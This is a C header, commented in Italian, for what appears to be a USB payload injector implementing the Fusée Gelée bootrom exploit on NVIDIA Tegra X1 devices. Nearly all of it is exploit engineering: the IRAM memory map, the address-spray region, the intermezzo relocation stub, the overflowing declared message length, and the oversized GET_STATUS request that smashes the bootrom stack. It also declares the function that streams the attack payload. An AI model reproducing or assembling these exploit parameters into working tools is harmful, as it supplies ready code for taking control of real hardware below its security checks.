#ifndef RCM_PROTO_H
#define RCM_PROTO_H
#include <stdbool.h>
#include <stdint.h>

// ===================================================================
//  COSTANTI DEL PROTOCOLLO
// ===================================================================
//
//  Fonte canonica: fusee-launcher (Katherine Temkin / ReSwitched),
//  fusee-launcher.py + intermezzo.s. Il paper Fusee Gelee (aprile 2018)
//  documenta il perche'; fusee-launcher il come.
//
//  Mappa di memoria che ne risulta, in IRAM del target:
//
//    0x40010000  inizio del CORPO del messaggio. I 680 byte di header
//                non finiscono qui: il bootrom li consuma per sapere
//                quanto leggere, il corpo parte dopo.
//    0x40010000 .. 0x4001F000
//                riempita interamente con l'indirizzo dell'intermezzo
//                (0xF000 byte = 0x3C00 word). Qualunque return address
//                lo smash vada a colpire, si salta all'intermezzo.
//    0x4001F000  intermezzo (92 byte): ricopia il payload da 0x40020000
//                a 0x40010000 e ci salta dentro.
//    0x40020000  payload utente.
//
//  Le due costanti in coda al blob intermezzo (0x40020000 e 0x40010000)
//  devono combaciare con RCM_PAYLOAD_LOAD_BLOCK e RCM_PAYLOAD_ADDR: se
//  tocchi questi define, il blob va rigenerato.
//
#define RCM_CHUNK_SIZE          0x1000u
#define RCM_DEVICE_ID_LEN       16

#define RCM_PAYLOAD_ADDR        0x40010000u
#define RCM_INTERMEZZO_ADDR     0x4001F000u
#define RCM_PAYLOAD_LOAD_BLOCK  0x40020000u

// Lunghezza dichiarata nell'header: e' il massimo che il bootrom
// accetta, ed e' esattamente il motivo per cui la copia trabocca. NON
// e' la quantita' di byte che spediamo davvero.
#define RCM_MAX_MSG_LEN         0x30298u

// Header RCM: 4 byte di lunghezza, poi zeri fino a 680 (0x2A8).
#define RCM_HEADER_SIZE         680u

// Spray: da inizio corpo fino all'intermezzo.
#define RCM_SPRAY_BYTES         (RCM_INTERMEZZO_ADDR - RCM_PAYLOAD_ADDR)  /* 0xF000  */
#define RCM_SPRAY_WORDS         (RCM_SPRAY_BYTES / 4u)                    /* 0x3C00  */

// Buffer ping-pong del bootrom. Servono solo come documentazione: per
// far atterrare l'ultima copia dove deve basta la parita' dei pacchetti
// da 0x1000 spediti (vedi fondo di rcm_proto_inject).
#define RCM_COPY_BUF_LOW        0x40005000u
#define RCM_COPY_BUF_HIGH       0x40009000u

// Control request finale: GET_STATUS con una wLength assurda. E' la
// lettura che fa smashare lo stack del bootrom.
#define RCM_TRIGGER_BMREQTYPE   0x81u
#define RCM_TRIGGER_BREQUEST    0x00u    /* TUSB_REQ_GET_STATUS */
#define RCM_TRIGGER_WLENGTH     0x7000u

// Prefisso fisso davanti al payload: header + spray + il blocco da
// 0x1000 che contiene intermezzo e il suo padding.
#define RCM_PREFIX_SIZE   (RCM_HEADER_SIZE + RCM_SPRAY_BYTES + RCM_CHUNK_SIZE)

// Fine dell'IRAM del Tegra X1: 256 KB da 0x40000000. E' questo il muro
// vero contro cui sbatte la dimensione del payload, non la lunghezza
// dichiarata nell'header. Il payload atterra su RCM_PAYLOAD_LOAD_BLOCK e
// da li' a 0x40040000 ci sono 0x20000 byte: oltre, l'intermezzo
// ricopierebbe da memoria che non esiste.
#define RCM_IRAM_END      0x40040000u

// Tetto del payload utile: 0x1FFF0 = 131056 byte. Coincide quasi
// esattamente con lo spazio fisico che resta sopra il blocco di
// caricamento, ed e' anche cio' che tiene il totale spedito vicino alla
// lunghezza dichiarata. Le due strade portano allo stesso numero, che e'
// un buon segno che il numero e' giusto.
#define RCM_PAYLOAD_MAX   (RCM_MAX_MSG_LEN - RCM_PREFIX_SIZE)

// Esegue l'intera sequenza: legge payload.bin dal FAT12 in flash e lo
// invia in streaming. Ritorna false se il file manca, e' troppo grande,
// o un transfer fallisce.
bool rcm_proto_inject(void);

#endif
